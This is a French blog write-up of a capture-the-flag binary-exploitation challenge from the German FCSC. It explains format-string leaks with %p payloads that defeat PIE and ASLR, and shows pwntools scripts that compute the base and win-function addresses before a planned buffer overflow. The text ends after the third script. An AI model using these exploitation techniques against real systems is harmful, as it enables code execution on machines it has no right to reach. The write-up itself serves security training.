<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>[German FCSC] - Intro to pwning 1 - Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)</title><meta name=Description content="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><meta property="og:title" content="[German FCSC] - Intro to pwning 1"><meta property="og:description" content="TL;DR Il existe 3 fonctions: une welcome vulnérable au format string, une AAAAAAAA vulnérable au buffer overflow et une fonction win qui permet de récupérer un bash. Le binaire est protégé par le bit NX, l&rsquo;ASLR et la PIE. La format string permet de contourner l&rsquo;ASLR et la PIE. Lorsque les adresses sont recalculées, il suffit d&rsquo;exploiter le buffer overflow pour attérir dans la fonction &ldquo;win&rdquo; et ainsi récupérer le flag."><meta property="og:type" content="article"><meta property="og:url" content="maki.bzh/writeups/fcscallemand2020pwn/"><meta property="og:image" content="/logo.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2020-02-05T21:57:40+08:00"><meta property="article:modified_time" content="2020-02-05T21:57:40+08:00"><meta property="og:site_name" content="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/logo.png"><meta name=twitter:title content="[German FCSC] - Intro to pwning 1"><meta name=twitter:description content="TL;DR Il existe 3 fonctions: une welcome vulnérable au format string, une AAAAAAAA vulnérable au buffer overflow et une fonction win qui permet de récupérer un bash. Le binaire est protégé par le bit NX, l&rsquo;ASLR et la PIE. La format string permet de contourner l&rsquo;ASLR et la PIE. Lorsque les adresses sont recalculées, il suffit d&rsquo;exploiter le buffer overflow pour attérir dans la fonction &ldquo;win&rdquo; et ainsi récupérer le flag."><meta name=application-name content="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><meta name=apple-mobile-web-app-title content="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=maki.bzh/writeups/fcscallemand2020pwn/><link rel=prev href=maki.bzh/writeups/fcscallemand2020introrev/><link rel=next href=maki.bzh/writeups/fcscfrench2020findme/><link rel=stylesheet href=/maki.bzh/css/style.min.css><link rel=preload href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css as=style onload="this.onload=null,this.rel='stylesheet'"><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css></noscript><link rel=preload href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css as=style onload="this.onload=null,this.rel='stylesheet'"><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"[German FCSC] - Intro to pwning 1","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"maki.bzh\/writeups\/fcscallemand2020pwn\/"},"image":["\/images\/Apple-Devices-Preview.png"],"genre":"writeups","keywords":"liveoverflow, fcsc, pwn, format string","wordcount":1399,"url":"maki.bzh\/writeups\/fcscallemand2020pwn\/","datePublished":"2020-02-05T21:57:40+08:00","dateModified":"2020-02-05T21:57:40+08:00","license":"This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher":{"@type":"Organization","name":"xxxx","logo":"\/lib\/images\/avatar.png"},"author":{"@type":"Person","name":"Maki"},"description":""}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem('theme')?localStorage.getItem('theme')==='dark':'dark'==='auto'?window.matchMedia('(prefers-color-scheme: dark)').matches:'dark'==='dark')&&document.body.setAttribute('theme','dark')</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=maki.bzh/ title="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><span class=header-title-pre><i class='far fa-kiss-wink-heart fa-fw' aria-hidden=true></i></span></a></div><div class=menu><div class=menu-inner><a class=menu-item href=/maki.bzh/posts/>Posts </a><a class=menu-item href=/maki.bzh/shorts/>Shorts </a><a class=menu-item href=/maki.bzh/offers/>Offers </a><a class=menu-item href=/maki.bzh/writeups/>Writeups </a><a class=menu-item href=/maki.bzh/tags/>Tags </a><a class=menu-item href=/maki.bzh/about/>About </a><span class="menu-item delimiter"></span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=maki.bzh/ title="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><span class=header-title-pre><i class='far fa-kiss-wink-heart fa-fw' aria-hidden=true></i></span></a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><a class=menu-item href=/maki.bzh/posts/ title>Posts</a><a class=menu-item href=/maki.bzh/shorts/ title>Shorts</a><a class=menu-item href=/maki.bzh/offers/ title>Offers</a><a class=menu-item href=/maki.bzh/writeups/ title>Writeups</a><a class=menu-item href=/maki.bzh/tags/ title>Tags</a><a class=menu-item href=/maki.bzh/about/ title>About</a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><main class=main><div class=container><div class="page single special"><h1 class="single-title animate__animated animate__pulse animate__faster">[German FCSC] - Intro to pwning 1</h1><div class=content id=content><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/german_fcsc/pwn//upload_8f2456481ef53f08c9c1d5e2490736da.png data-srcset="/lib/images/writeups/german_fcsc/pwn//upload_8f2456481ef53f08c9c1d5e2490736da.png, /lib/images/writeups/german_fcsc/pwn//upload_8f2456481ef53f08c9c1d5e2490736da.png 1.5x, /lib/images/writeups/german_fcsc/pwn//upload_8f2456481ef53f08c9c1d5e2490736da.png 2x" data-sizes=auto alt=/lib/images/writeups/german_fcsc/pwn//upload_8f2456481ef53f08c9c1d5e2490736da.png title=/lib/images/writeups/german_fcsc/pwn//upload_8f2456481ef53f08c9c1d5e2490736da.png></p><h2 id=tldr>TL;DR</h2><p>Il existe 3 fonctions: une <code>welcome</code> vulnérable au format string, une <code>AAAAAAAA</code> vulnérable au buffer overflow et une fonction <code>win</code> qui permet de récupérer un bash.
Le binaire est protégé par le bit NX, l&rsquo;ASLR et la PIE. La format string permet de contourner l&rsquo;ASLR et la PIE. Lorsque les adresses sont recalculées, il suffit d&rsquo;exploiter le buffer overflow pour attérir dans la fonction &ldquo;win&rdquo; et ainsi récupérer le flag.</p><h2 id=etat-des-lieux>Etat des lieux</h2><p>Ce challenge est le premier d&rsquo;une suite de 3 challenges d&rsquo;introduction à l&rsquo;exploitation de binaire. Le but du premier est de contourner les protections mises en place afin d&rsquo;exécuter des commandes sur le serveur distant.</p><p>Le binaire est soumis aux protections suivantes:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/german_fcsc/pwn//upload_89a920616938f03c5833ae988f5d4e9d.png data-srcset="/lib/images/writeups/german_fcsc/pwn//upload_89a920616938f03c5833ae988f5d4e9d.png, /lib/images/writeups/german_fcsc/pwn//upload_89a920616938f03c5833ae988f5d4e9d.png 1.5x, /lib/images/writeups/german_fcsc/pwn//upload_89a920616938f03c5833ae988f5d4e9d.png 2x" data-sizes=auto alt=/lib/images/writeups/german_fcsc/pwn//upload_89a920616938f03c5833ae988f5d4e9d.png title=/lib/images/writeups/german_fcsc/pwn//upload_89a920616938f03c5833ae988f5d4e9d.png></p><p>Les sources du challenges sont données, ce qui est plus simple pour identifier des vulnérabilités. Ci-dessous les 3 fonctions principales du programme:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/german_fcsc/pwn//upload_f5986b409e1672eccd12662c1d67356f.png data-srcset="/lib/images/writeups/german_fcsc/pwn//upload_f5986b409e1672eccd12662c1d67356f.png, /lib/images/writeups/german_fcsc/pwn//upload_f5986b409e1672eccd12662c1d67356f.png 1.5x, /lib/images/writeups/german_fcsc/pwn//upload_f5986b409e1672eccd12662c1d67356f.png 2x" data-sizes=auto alt=/lib/images/writeups/german_fcsc/pwn//upload_f5986b409e1672eccd12662c1d67356f.png title=/lib/images/writeups/german_fcsc/pwn//upload_f5986b409e1672eccd12662c1d67356f.png></p><p>Il est possible d&rsquo;identifier deux endroits où la fonction &ldquo;gets()&rdquo; est utilisée: la fonction <code>welcome()</code> et <code>AAAAAAAA()</code>. La fonction <code>WINgardium_leviosa()</code> quant à elle permet de récupérer l&rsquo;accès à un bash.</p><p>La fonction <code>gets()</code> est considérée comme dangereuse, car il est possible de lui passer un buffer en paramètre, mais sans préciser la taille. C&rsquo;est pourquoi il est très dangereux d&rsquo;utiliser cette fonction sur une entrée utilisateur.</p><p>Etant donné que la PIE est activé sur ce binaire, il est impossible de connaitre l&rsquo;adresse de la fonction win sans leak de mémoire. C&rsquo;est pour cela que le <code>gets(read_buf);</code> de la fonction <code>welcome()</code> sera utilisé.
Lorsque la mémoire sera leaké, le second <code>gets()</code> permettra de jump sur la fonction de win et ainsi récupérer le flag. Ci-dessous un schéma reprenant ce qui a été dit auparavant:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/german_fcsc/pwn//upload_0adf691915300153f6410196c0a93d3b.png data-srcset="/lib/images/writeups/german_fcsc/pwn//upload_0adf691915300153f6410196c0a93d3b.png, /lib/images/writeups/german_fcsc/pwn//upload_0adf691915300153f6410196c0a93d3b.png 1.5x, /lib/images/writeups/german_fcsc/pwn//upload_0adf691915300153f6410196c0a93d3b.png 2x" data-sizes=auto alt=/lib/images/writeups/german_fcsc/pwn//upload_0adf691915300153f6410196c0a93d3b.png title=/lib/images/writeups/german_fcsc/pwn//upload_0adf691915300153f6410196c0a93d3b.png></p><h2 id=contournement-de-la-pie>Contournement de la PIE</h2><p>Afin de contourner la PIE, il faut faire fuiter la mémoire grâce à l&rsquo;utilisation du mécanisme &ldquo;format string&rdquo;. Ces &ldquo;chaines de format&rdquo; permettent aux développeurs de pouvoir formater leur variable pendant l&rsquo;affichage.</p><p>Parmis celles qui vont nous intéresser, il est possible de retrouver:</p><table><thead><tr><th>Format string</th><th>Usage</th></tr></thead><tbody><tr><td>%s / %x</td><td>Permet de lire une donnée d&rsquo;un pointeur connu sous forme de chaine de carctère ou hexa</td></tr><tr><td>%n</td><td>Permet d&rsquo;écrire de la donnée à un pointeur connu</td></tr><tr><td>%p</td><td>Permet d&rsquo;afficher les pointeurs sur la stack</td></tr></tbody></table><p>Les deux premiers types de chaines de format permettent de lire et écrire à un pointeur connu. Or, ce n&rsquo;est pas le cas ici. C&rsquo;est pourquoi on va utiliser <code>%p</code>.</p><p>Pour tout ce qui est exploitation de binaire et gestion des bytes, python2 reste plus simple à utiliser. De plus, la librairie &ldquo;pwntools&rdquo; offre plus de possibilité en python2.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/python2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>FORMATSTRING</span> <span class=o>=</span> <span class=s2>&#34;37:%37$p 38:%38$p 39:%39$p 40:%40$p 41:%41$p 42:%42$p 43:%43$p 44:%44$p 45:%45$p 46:%46$p 47:%47$p 48:%48$p 49:%49$p 50:%50$p 51:%51$p 52:%52$p 53:%53$p 54:%54$p 55:%55$p 56:%56$p 57:%57$p 58:%58$p 59:%59$p 60:%60$p 61:%61$p 62:%62$p 63:%63$p 64:%64$p&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./pwn1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;name:&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>FORMATSTRING</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>leak</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;spell:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>leak</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39; &#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>raw_input</span><span class=p>(</span><span class=s2>&#34;gdb attach&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>Le gros payload <code>FORMATSTRING</code> est utile pour identifier rapidement quel bloque nous intéresse. Pour le générer, il est possible d&rsquo;utiliser cette petit boucle bash:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=k>for</span> i in <span class=k>$(</span>seq <span class=m>1</span> 64<span class=k>)</span><span class=p>;</span> <span class=k>do</span> <span class=nb>echo</span> <span class=s2>&#34;</span><span class=nv>$i</span><span class=s2>:%</span><span class=nv>$i</span><span class=s2>\$p&#34;</span><span class=p>;</span> <span class=k>done</span> <span class=p>|</span> tr <span class=s1>&#39;\n&#39;</span> <span class=s1>&#39; &#39;</span> 
</span></span></code></pre></td></tr></table></div></div><p>La fonction &ldquo;raw_input&rdquo; permet de bloquer l&rsquo;exécution du programme et laisse le temps à l&rsquo;attaquant de s&rsquo;attacher au process.</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/german_fcsc/pwn//upload_b5159cd31594861ef3dde8be193143a7.png data-srcset="/lib/images/writeups/german_fcsc/pwn//upload_b5159cd31594861ef3dde8be193143a7.png, /lib/images/writeups/german_fcsc/pwn//upload_b5159cd31594861ef3dde8be193143a7.png 1.5x, /lib/images/writeups/german_fcsc/pwn//upload_b5159cd31594861ef3dde8be193143a7.png 2x" data-sizes=auto alt=/lib/images/writeups/german_fcsc/pwn//upload_b5159cd31594861ef3dde8be193143a7.png title=/lib/images/writeups/german_fcsc/pwn//upload_b5159cd31594861ef3dde8be193143a7.png></p><p>On cherche une adresse de fonction sur la stack, donc ça peut être l&rsquo;adresse de &ldquo;main&rdquo;, &ldquo;welcome&rdquo; ou &ldquo;AAAAAAAA&rdquo;. Etant donné que la fonction &ldquo;win&rdquo; n&rsquo;est pas appelée, il n&rsquo;est pas possible de la trouver sur la stack en temps normal.</p><p>Le plugin &ldquo;pwndbg&rdquo; pour gdb est vraiment pratique pour récupérer tout un tas d&rsquo;information sur le contexte d&rsquo;exécution d&rsquo;un binaire.</p><p>On va lancer une première fois le binaire avec pwntool et s&rsquo;attacher au process avec gdb:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ sudo gdb -p <span class=sb>`</span>pidof pwn1<span class=sb>`</span>
</span></span><span class=line><span class=cl><span class=o>(</span>pwndbg<span class=o>)</span> &gt; b* main
</span></span><span class=line><span class=cl><span class=o>(</span>pwndbg<span class=o>)</span> &gt; vmmap
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/german_fcsc/pwn//upload_0e52096aa4301a433becae14b83c838e.png data-srcset="/lib/images/writeups/german_fcsc/pwn//upload_0e52096aa4301a433becae14b83c838e.png, /lib/images/writeups/german_fcsc/pwn//upload_0e52096aa4301a433becae14b83c838e.png 1.5x, /lib/images/writeups/german_fcsc/pwn//upload_0e52096aa4301a433becae14b83c838e.png 2x" data-sizes=auto alt=/lib/images/writeups/german_fcsc/pwn//upload_0e52096aa4301a433becae14b83c838e.png title=/lib/images/writeups/german_fcsc/pwn//upload_0e52096aa4301a433becae14b83c838e.png></p><p>Les adresses en <code>0x55...</code> sont donc des adresses liées au binaire en exécution.</p><p>Si on reprend la capture d&rsquo;écran au dessus, il y en a quelques unes:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/german_fcsc/pwn//upload_e602134b7b6bf97e439d03c283b5bd4d.png data-srcset="/lib/images/writeups/german_fcsc/pwn//upload_e602134b7b6bf97e439d03c283b5bd4d.png, /lib/images/writeups/german_fcsc/pwn//upload_e602134b7b6bf97e439d03c283b5bd4d.png 1.5x, /lib/images/writeups/german_fcsc/pwn//upload_e602134b7b6bf97e439d03c283b5bd4d.png 2x" data-sizes=auto alt=/lib/images/writeups/german_fcsc/pwn//upload_e602134b7b6bf97e439d03c283b5bd4d.png title=/lib/images/writeups/german_fcsc/pwn//upload_e602134b7b6bf97e439d03c283b5bd4d.png></p><p>L&rsquo;adresse pointée par les flèches est l&rsquo;adresse de &ldquo;main&rdquo;:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/german_fcsc/pwn//upload_cdb8ee9979a49a15db5ee8402df50f6f.png data-srcset="/lib/images/writeups/german_fcsc/pwn//upload_cdb8ee9979a49a15db5ee8402df50f6f.png, /lib/images/writeups/german_fcsc/pwn//upload_cdb8ee9979a49a15db5ee8402df50f6f.png 1.5x, /lib/images/writeups/german_fcsc/pwn//upload_cdb8ee9979a49a15db5ee8402df50f6f.png 2x" data-sizes=auto alt=/lib/images/writeups/german_fcsc/pwn//upload_cdb8ee9979a49a15db5ee8402df50f6f.png title=/lib/images/writeups/german_fcsc/pwn//upload_cdb8ee9979a49a15db5ee8402df50f6f.png></p><p>En comparant avec les sources, il est possible d&rsquo;identifier qu&rsquo;il s&rsquo;agit de la même fonction:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/german_fcsc/pwn//upload_7f3b93fd7eb1a4b193a22f9bdef39fa5.png data-srcset="/lib/images/writeups/german_fcsc/pwn//upload_7f3b93fd7eb1a4b193a22f9bdef39fa5.png, /lib/images/writeups/german_fcsc/pwn//upload_7f3b93fd7eb1a4b193a22f9bdef39fa5.png 1.5x, /lib/images/writeups/german_fcsc/pwn//upload_7f3b93fd7eb1a4b193a22f9bdef39fa5.png 2x" data-sizes=auto alt=/lib/images/writeups/german_fcsc/pwn//upload_7f3b93fd7eb1a4b193a22f9bdef39fa5.png title=/lib/images/writeups/german_fcsc/pwn//upload_7f3b93fd7eb1a4b193a22f9bdef39fa5.png></p><p>Pour récupérer l&rsquo;adresse de base, il suffit de soutraire la base adresse trouvée dans &ldquo;vmmap&rdquo; et l&rsquo;adresse de main:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/german_fcsc/pwn//upload_077c13eee08fafbc7106430098b08630.png data-srcset="/lib/images/writeups/german_fcsc/pwn//upload_077c13eee08fafbc7106430098b08630.png, /lib/images/writeups/german_fcsc/pwn//upload_077c13eee08fafbc7106430098b08630.png 1.5x, /lib/images/writeups/german_fcsc/pwn//upload_077c13eee08fafbc7106430098b08630.png 2x" data-sizes=auto alt=/lib/images/writeups/german_fcsc/pwn//upload_077c13eee08fafbc7106430098b08630.png title=/lib/images/writeups/german_fcsc/pwn//upload_077c13eee08fafbc7106430098b08630.png></p><p>Maintenant, la PIE est complètement contourné, car il est possible de récupérer l&rsquo;adresse de base via un leak.</p><p>En modifiant un peu le script d&rsquo;exploitation, il est possible de récupérer à tout les coups l&rsquo;adresse de base:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/python2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>FORMATSTRING</span> <span class=o>=</span> <span class=s2>&#34;|%47$p|&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./pwn1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;name:&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>FORMATSTRING</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>leak</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;spell:&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;|&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>base_addr</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>leak</span><span class=p>[</span><span class=o>-</span><span class=mi>2</span><span class=p>],</span> <span class=mi>16</span><span class=p>)</span><span class=o>-</span><span class=mh>0x36f</span>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;Adresse de base: </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>base_addr</span><span class=p>)))</span>
</span></span><span class=line><span class=cl><span class=n>raw_input</span><span class=p>(</span><span class=s2>&#34;gdb attach&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/german_fcsc/pwn//upload_0ae689293e4f08ce4709d7ff3cb86bb1.png data-srcset="/lib/images/writeups/german_fcsc/pwn//upload_0ae689293e4f08ce4709d7ff3cb86bb1.png, /lib/images/writeups/german_fcsc/pwn//upload_0ae689293e4f08ce4709d7ff3cb86bb1.png 1.5x, /lib/images/writeups/german_fcsc/pwn//upload_0ae689293e4f08ce4709d7ff3cb86bb1.png 2x" data-sizes=auto alt=/lib/images/writeups/german_fcsc/pwn//upload_0ae689293e4f08ce4709d7ff3cb86bb1.png title=/lib/images/writeups/german_fcsc/pwn//upload_0ae689293e4f08ce4709d7ff3cb86bb1.png></p><p>Une base address est reconnaissable grâce aux &ldquo;000&rdquo; à la fin. Ces zéros sont là, car la base address doit être alignée sur une page mémoire (0x1000).</p><p>De la même façon, il est possible de calculer l&rsquo;offset de la fonction win et pouvoir jump dessus plus tard:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/german_fcsc/pwn//upload_4bba29f3895264a062f4640854ea2206.png data-srcset="/lib/images/writeups/german_fcsc/pwn//upload_4bba29f3895264a062f4640854ea2206.png, /lib/images/writeups/german_fcsc/pwn//upload_4bba29f3895264a062f4640854ea2206.png 1.5x, /lib/images/writeups/german_fcsc/pwn//upload_4bba29f3895264a062f4640854ea2206.png 2x" data-sizes=auto alt=/lib/images/writeups/german_fcsc/pwn//upload_4bba29f3895264a062f4640854ea2206.png title=/lib/images/writeups/german_fcsc/pwn//upload_4bba29f3895264a062f4640854ea2206.png></p><p>Il est possible de vérifier que notre offset est correct. On modifie à nouveau notre script pour qu&rsquo;il affiche l&rsquo;adresse re calculée et avec gdb il est possible de voir s&rsquo;il s&rsquo;agit de la bonne fonction:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/python2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>FORMATSTRING</span> <span class=o>=</span> <span class=s2>&#34;|%47$p|&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./pwn1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;name:&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>FORMATSTRING</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>leak</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;spell:&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;|&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>base_addr</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>leak</span><span class=p>[</span><span class=o>-</span><span class=mi>2</span><span class=p>],</span> <span class=mi>16</span><span class=p>)</span><span class=o>-</span><span class=mh>0x36f</span>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;Adresse de base: </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>base_addr</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>win_offset</span> <span class=o>=</span> <span class=n>base_addr</span><span class=o>+</span><span class=mh>0x267</span>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;Adresse de la fonction win: </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>win_offset</span><span class=p>)))</span>
</span></span><span class=line><span class=cl><span class=n>raw_input</span><span class=p>(</span><span class=s2>&#34;gdb attach&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
